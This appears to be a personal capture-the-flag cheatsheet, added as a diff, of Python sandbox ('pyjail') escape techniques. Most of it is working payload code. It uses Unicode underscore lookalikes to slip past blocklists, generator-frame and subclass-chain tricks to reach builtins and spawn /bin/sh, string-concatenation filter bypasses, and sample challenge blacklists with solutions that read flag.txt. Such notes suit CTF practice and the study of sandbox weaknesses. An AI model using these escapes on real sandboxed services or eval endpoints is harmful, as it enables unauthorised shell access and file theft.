@@ -1,0 +1,119 @@
+# HARIZ-NOTES-CHEATSHEET
+nota
+GOOD PERSON: https://shirajuki.js.org/blog/pyjail-cheatsheet/
+
+FIND FLAW(print, unicode, function, lambda, what not blocked)
+
+FULL DIRECTORY FLAW:
+#blacklist=[]
+#print
+#
+
+DOUBLE UNDERSCORE BLOCKED:
+#_＿{STUFF_NAME}＿_  -- EXAMPLE: _＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵())
+
+
+GENERATOR(can call builtins/globals/locals even if directory emptied)
+#(_ for _ in ()).gi_frame -- generator
+#(_ for _ in ()).gi_frame.f_builtins -- generator(print.__self__ or __builtins__)
+#(_ for _ in ()).gi_frame.f_globals -- generator(globals() or __globals__)
+#(_ for _ in ()).gi_frame.f_locals -- generator(locals() or __locals__)
+
+EXAMPLE USAGE OF GENERATOR(*BUILTINS IS NOT EMPTY)
+#(_ for _ in ()).gi_frame.f_builtins['__import__']('pdb').set_trace() = __import__('pdb').set_trace()
+#(_ for _ in ()).gi_frame.f_builtins['__import__']('os').system(COMMAND) = __import__('os').system(COMMAND)
+#(_ for _ in ()).gi_frame.f_builtins['ex'+'ec']('print(open("flag.txt", "r").read()'))=exec(print(open("flag.txt", "r").read()))
+#(_ for _ in ()).gi_frame.f_builtins['ev'+'al']('print(open("flag.txt", "r").read()'))=eval(print(open("flag.txt", "r").read()))
+#(_ for _ in ()).gi_frame.f_builtins['open']('flag.txt','r').read() = open('flag.txt', 'r').read()
+#(_ for _ in ()).gi_frame.f_builtins['ex'+'ec'](input()) -- input is actually easier
+
+BUILTINS BANNED; NOT EMPTIED
+(_ for _ in ()).gi_frame.f_globals['BLACKLIST']=[] -- emptying the blacklists(EXEC)
+(_ for _ in ()).gi_frame.f_globals['__buil'+'tins__'][{BUILTINS STUFF}]
+
+GLOBALS BANNED; NOT EMPTIED
+
+
+EMPTY DIRECTORY:
+##USE LAMBDA
+if 'print':print
+#a=print._＿self＿_  -- a is full directory
+
+if 'open':open
+#a=open._＿self＿_  -- a is full DIRECTORY
+
+===basically, all {built in method}.__self__ = __builtins__
+
+__builtins__ directory:
+'__name__', '__doc__', '__package__', '__loader__', '__spec__', '__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint', 'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'format', 'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'issubclass', 'iter', 'aiter', 'len', 'locals', 'max', 'min', 'next', 'anext', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'None', 'Ellipsis', 'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'classmethod', 'complex', 'dict', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map', 'object', 'range', 'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip', '__debug__', 'BaseException', 'BaseExceptionGroup', 'Exception', 'GeneratorExit', 'KeyboardInterrupt', 'SystemExit', 'ArithmeticError', 'AssertionError', 'AttributeError', 'BufferError', 'EOFError', 'ImportError', 'LookupError', 'MemoryError', 'NameError', 'OSError', 'ReferenceError', 'RuntimeError', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SystemError', 'TypeError', 'ValueError', 'Warning', 'FloatingPointError', 'OverflowError', 'ZeroDivisionError', 'BytesWarning', 'DeprecationWarning', 'EncodingWarning', 'FutureWarning', 'ImportWarning', 'PendingDeprecationWarning', 'ResourceWarning', 'RuntimeWarning', 'SyntaxWarning', 'UnicodeWarning', 'UserWarning', 'BlockingIOError', 'ChildProcessError', 'ConnectionError', 'FileExistsError', 'FileNotFoundError', 'InterruptedError', 'IsADirectoryError', 'NotADirectoryError', 'PermissionError', 'ProcessLookupError', 'TimeoutError', 'IndentationError', '_IncompleteInputError', 'IndexError', 'KeyError', 'ModuleNotFoundError', 'NotImplementedError', 'PythonFinalizationError', 'RecursionError', 'UnboundLocalError', 'UnicodeError', 'BrokenPipeError', 'ConnectionAbortedError', 'ConnectionRefusedError', 'ConnectionResetError', 'TabError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeTranslateError', 'ExceptionGroup', 'EnvironmentError', 'IOError', 'WindowsError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 'help'
+
+IF BLACKLIST IS REPLACE TO "":
+##imagine blacklist=['open']
+opopenen= open -- 'op'+''+'en'='open'
+
+##formula
+{BLACKBLACKLISTEDLISTED}=BLACKLISTED -- 'BLACK'+''+'LISTED' = BLACKLISTED
+
+NO UNICODE:
+𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() # import os;os.system("/bin/sh")
+
+no ASCII letters, no double underscores, inside eval
+_＿𝘪𝘮𝘱𝘰𝘳𝘵＿()._＿𝘤𝘭𝘢𝘴𝘴＿__(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵()) # double underscore bypass by having underscore + unicode underscore (https://www.compart.com/en/unicode/U+005F) -> U+FE33, U+FE34, U+FE4D, U+FE4E, U+FE4F, U+FF3F
+
+no ASCII letters, no double underscores, no builtins, inside eval
+()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦("\\157\\163").𝘴𝘺𝘴𝘵𝘦m("\\57\\142\\151\\156\\57\\163\\150")
+
+no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)
+[𝘺:=()._＿𝘥𝘰𝘤＿_,𝘢:=y[19],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺[34]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺[56])]
+
+# no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)
+(𝘥:=()._＿𝘥𝘰𝘤＿_,d:=()._＿dir＿_().__class__(d),𝘴:=𝘥.𝘱𝘰𝘱(19),𝘥._＿𝘤𝘭𝘢𝘴𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_).𝘱𝘰𝘱(1)._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().𝘱𝘰𝘱(104).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.𝘱𝘰𝘱(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.𝘱𝘰𝘱(54)))
+
+# no double underscores, no builtins, no quotes/double quotes, no parenthesis inside eval, has existing object (>= python3.8)
+class cobj:...
+obj = cobj()
+[d:=[]._＿doc＿_,o:=d[32],s:=d[17],h:=d[54],[obj[s+h] for obj._＿class＿_._＿getitem＿_ in [[obj[o+s] for obj._＿class＿_._＿getitem＿_ in [[+obj for obj._＿class＿_._＿pos＿_ in [[]._＿class＿_._＿mro＿_[1]._＿subclasses＿_]][0][104].load_module]][0].system]]]
+
+GOOD FUNCTIONS:
+#getattr/.__getattribute__(if .__ cannot be used):
+BASIC:
+getattr(stuff, inside the stuff) <--()/[]/{}/. =
+getattr(BUILTINSMETHOD, '__self__') = BUILTINSMETHOD.__self__ = __builtins__
+
+if BUILTINSMETHOD most is Banned:
+getattr(getattr(BUILTINSMETHODNOTBANNED, '__self__'), BUILTINSMETHODBANNED(str-conc))
+
+exp:
+getattr(getattr(compile, '__self__'),'pri'+'nt')(getattr(getattr(getattr(compile,'__self__'), 'op'+'en')('fla'+'g.t'+'xt', 'r'), 're'+'ad')())
+
+#sys or __import__['sys']
+sys.modules.get('builtins')
+
+#join -- basically str conc
+#chr -- basically unicode number-->str
+#raise Exception -- print but will raised as an error
+#vars -- basically .__dict__
+#tuple(open()) -- basically open.read() but with extras
+#_＿self＿_ -- unicode bypass __self__
+
+WRITEUPS:
+#(test1.py -- Har1111z) blacklist: ['flag','open','txt','print','breakpoint','pdb','import','.__','Banned','globals','locals','exec','eval','os','sys','read','write','builtins']
+INTENDED SOLVE: getattr(compile._＿self＿_, 'pri'+'nt')((tuple(getattr(compile._＿self＿_, 'op'+'en')('fl'+'ag.tx'+'t', 'r'))))
+explain:getattr not blocked, unicode underscore not filtered, ＿_
+
+#(test3.py -- Har1111z) BANNED: ['flag','open','txt','breakpoint','pdb','import','BANNED','globals','locals','exec','eval','os','read','write','builtins']
+INTENDED SOLVE: print(tuple(vars(sys.modules.get("bui"+"ltins")).get('op'+'en')('fla'+'g.tx'+'t')))
+explain:
+output: FLAG{FLAG}
+
+#(test4.py -- Har1111z) blacklist: ["import", "os", "sys", "open", "read", "flag","eval","exec"]
+INTENDED SOLVE: a=(_ for _ in ()).gi_frame.f_builtins;a['pri'+'nt'](tuple(a['op'+'en']('fl'+'ag.txt','r')))
+output: FLAG{FLAG}
+explain:
+
+#(protocol_1.py -- MRSM Hacklaa!)
+BLACKLIST = ["import", "os", "sys", "eval", "exec", "open", "read", "write", "getattr", "setattr", "delattr", "builtins", "locals", "vars", "dir", "compile", "globals"]
+WRONG_PATH = ["__class__", "__base__", "__subclasses__", "__mro__", "__builtins__", "__dict__", "__module__", "__init__", "__func__", ".__", '__globals__']
+INTENDED SOLVE: print(opopenen("flag.txt","r").rereadad())
+WHAT RUNNED   : exec('print(op'+''+'en("flag.txt","r").re'+''+'ad()))
+output: FLAG{FLAG}
